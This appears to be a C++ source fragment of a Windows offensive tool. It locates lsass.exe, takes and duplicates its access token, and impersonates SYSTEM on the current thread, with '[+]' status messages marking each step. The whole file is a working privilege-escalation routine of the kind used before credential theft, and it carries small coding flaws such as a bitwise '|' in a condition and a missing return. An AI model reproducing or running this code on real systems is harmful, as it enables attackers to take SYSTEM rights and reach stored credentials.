#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#include "GetAccessToken.h"
#include "PidByName.h"
#include <string.h>
#pragma comment (lib, "Dbghelp.lib")
#pragma comment (lib, "ntdll.lib")
#pragma comment (lib, "advapi32.lib")

STARTUPINFO si = {};
PROCESS_INFORMATION pi = {};
DWORD LastError;
DWORD pid;
DWORD PrimaryThreadId;
HKEY hKey;
SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
HANDLE pSystemToken = new HANDLE;
HANDLE CurrentThread = GetCurrentThread();

int ElevateToken()
{
	pid = PIDByName(L"lsass.exe");
	HANDLE pToken = GetAccessToken(pid);
	if (pid == 0 | pid == NULL) {
		printf("[!] Changed ZERO pid!");
		return 1;
	}
	printf("[+] lsass pid: %d\n", pid);

	if (!DuplicateToken(pToken, seImpersonateLevel, &pSystemToken))
	{
		DWORD LastError = GetLastError();
		printf("[-] DuplicateToken() ERROR : %d\n", LastError);
		return 1;
	}
	printf("[+] SYSTEM token duplication successfully!\n");
	
	if (!SetThreadToken(NULL, pSystemToken))
	{
		DWORD LastError = GetLastError();
		printf("SetThreadToken() ERROR : %d\n", LastError);
		return 1;
	}
}